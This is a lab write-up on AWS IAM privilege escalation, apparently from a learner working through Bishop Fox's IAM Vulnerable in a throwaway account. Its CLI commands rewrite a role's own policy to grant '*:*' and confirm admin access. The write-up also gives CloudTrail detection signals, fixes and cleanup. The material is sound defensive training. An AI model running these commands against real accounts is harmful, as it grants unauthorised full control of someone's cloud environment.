# IAM Privilege Escalation Notes — IAM Vulnerable (Bishop Fox)

Lab: [BishopFox/iam-vulnerable](https://github.com/BishopFox/iam-vulnerable), deployed with Terraform into a dedicated throwaway AWS account. All work done in a lab; account ID and keys blurred in screenshots. Resources torn down with `terraform destroy` afterward.

**Setup model:** the lab creates each escalation path as a *role* you assume from your admin identity (no long-lived keys). A profile in `~/.aws/config` assumes the weak role:

```ini
[profile privesc-cpv]
role_arn = arn:aws:iam::<account>:role/privesc1-CreateNewPolicyVersion-role
source_profile = default
```

`source_profile = default` = use my admin creds to *do the assuming*; every `--profile privesc-cpv` command then runs as the weak role.

---

## Path A — `iam:CreatePolicyVersion`  ✅ completed

### The weakness
An IAM managed policy holds up to 5 versions; one is the live ("default") version. The `privesc1-CreateNewPolicyVersion-role` had a single attached policy whose only statement was:

```json
{ "Action": "iam:CreatePolicyVersion", "Effect": "Allow", "Resource": "*" }
```

That policy is **attached to the role** (so it defines the role's permissions) **and** its `CreatePolicyVersion` right covers `Resource: "*"` (so it can rewrite itself). The role can therefore add a new default version of its own governing policy that allows everything — self-promotion to admin. The permission reads as "edit a policy"; it means "grant myself anything."

### The commands
```bash
# 1. Became the weak role
aws sts get-caller-identity --profile privesc-cpv
# -> assumed-role/privesc1-CreateNewPolicyVersion-role/...  (NOT my admin user)

# 2. The role can't even enumerate itself (it has ONLY CreatePolicyVersion):
aws iam list-attached-role-policies --role-name privesc1-CreateNewPolicyVersion-role --profile privesc-cpv
# -> AccessDenied  (realistic: a weak identity is often blind)

# 3. Found the target by enumerating as ADMIN (I own the account):
aws iam list-attached-role-policies --role-name privesc1-CreateNewPolicyVersion-role
aws iam get-policy-version --policy-arn arn:aws:iam::<account>:policy/privesc1-CreateNewPolicyVersion --version-id v1
# -> confirmed Action iam:CreatePolicyVersion on Resource "*", IsDefaultVersion true

# 4. Escalated AS THE WEAK ROLE: new default version granting *:*
#    admin.json = {"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}
aws iam create-policy-version \
  --policy-arn arn:aws:iam::<account>:policy/privesc1-CreateNewPolicyVersion \
  --policy-document file://admin.json --set-as-default --profile privesc-cpv

# 5. Proof: a call the role could NOT make before now succeeds
aws iam list-users --profile privesc-cpv        # before: AccessDenied -> after: full list
```

### Detection (what a SOC would watch for)
- CloudTrail event **`CreatePolicyVersion`**, especially with request parameter **`setAsDefault: true`**, from a non-admin principal.
- Stronger signal: the new version's document contains `"Action": "*"` / `"Resource": "*"`. Almost no legitimate change rewrites a policy's live version to full admin.
- Often preceded by recon: `ListAttachedRolePolicies`, `ListPolicyVersions`, `GetPolicyVersion`.
- Detection-as-code idea (W10): alert on `CreatePolicyVersion` where `setAsDefault = true` AND the policy document grants `*`.

### The fix
- Don't grant `iam:CreatePolicyVersion` on a policy the grantee is governed by; scope the `Resource` to specific non-self policies, or remove the permission.
- Apply a **permission boundary** so even a rewritten `*:*` version can't exceed the cap (Lesson Book 6.5).
- Least privilege: the role needed none of this.

### Cleanup
```bash
aws iam set-default-policy-version --policy-arn arn:aws:iam::<account>:policy/privesc1-CreateNewPolicyVersion --version-id v1
aws iam delete-policy-version      --policy-arn arn:aws:iam::<account>:policy/privesc1-CreateNewPolicyVersion --version-id v2
```

### Evidence
`12-iam-privesc.png` — weak profile's `list-users` succeeding after the rewrite (account ID blurred).

---

## Path B — `iam:PassRole` + compute  ⬜ optional / not yet done

### The weakness (concept)
"Passing a role" hands a role's permissions to a service you start (EC2, Lambda, Glue, SageMaker, CloudFormation...). With `iam:PassRole` for a privileged role **plus** the ability to launch compute (`ec2:RunInstances`, `lambda:CreateFunction`+`InvokeFunction`, ...), you run your own code *as that admin role*. It's the bridge from "I can run things" to "I can run things as an admin." IAM Vulnerable paths `privesc15`–`privesc21` are variations.

### The commands
_(fill in if/when I run it — e.g. `privesc16-PassRoleToNewLambdaThenInvoke`)_

### Detection
- CloudTrail: `PassRole` followed closely by `RunInstances` / `CreateFunction` / `CreateDevEndpoint` referencing a privileged role, from a non-admin principal.
- The quick `PassRole -> launch compute` sequence is the signature.

### The fix
- Scope `iam:PassRole` by `Resource` to specific, non-privileged roles. **Never** `iam:PassRole` on `Resource: "*"`. This one line closes most PassRole paths.

---

## The one-paragraph interview answer

> "In a throwaway AWS account I deployed Bishop Fox's IAM Vulnerable with Terraform and worked a privilege-escalation path hands-on. The role had a single permission, `iam:CreatePolicyVersion` scoped to `Resource: *`, on a policy attached to itself. As that role I couldn't even enumerate — realistic for a weak identity — so I found the target policy as admin, then rewrote its default version to allow `*:*` and confirmed by listing every user, which the role couldn't do before. A SOC catches this on the CloudTrail `CreatePolicyVersion` event with `setAsDefault:true` whose new document grants `*`; the fix is to scope the resource and apply a permission boundary. The bigger lesson is that `iam:PassRole` on `Resource:*` is the permission I'd watch most, because it bridges 'run compute' into 'run as admin.'"

## IAM evaluation logic (the backbone — Lesson Book 6.4)
Default **deny** → an explicit **Deny** anywhere always wins → the request must pass every guardrail (SCP, permission boundary, session policy) → then an **Allow** in an identity- or resource-based policy grants it. Boundaries only cap, never grant.
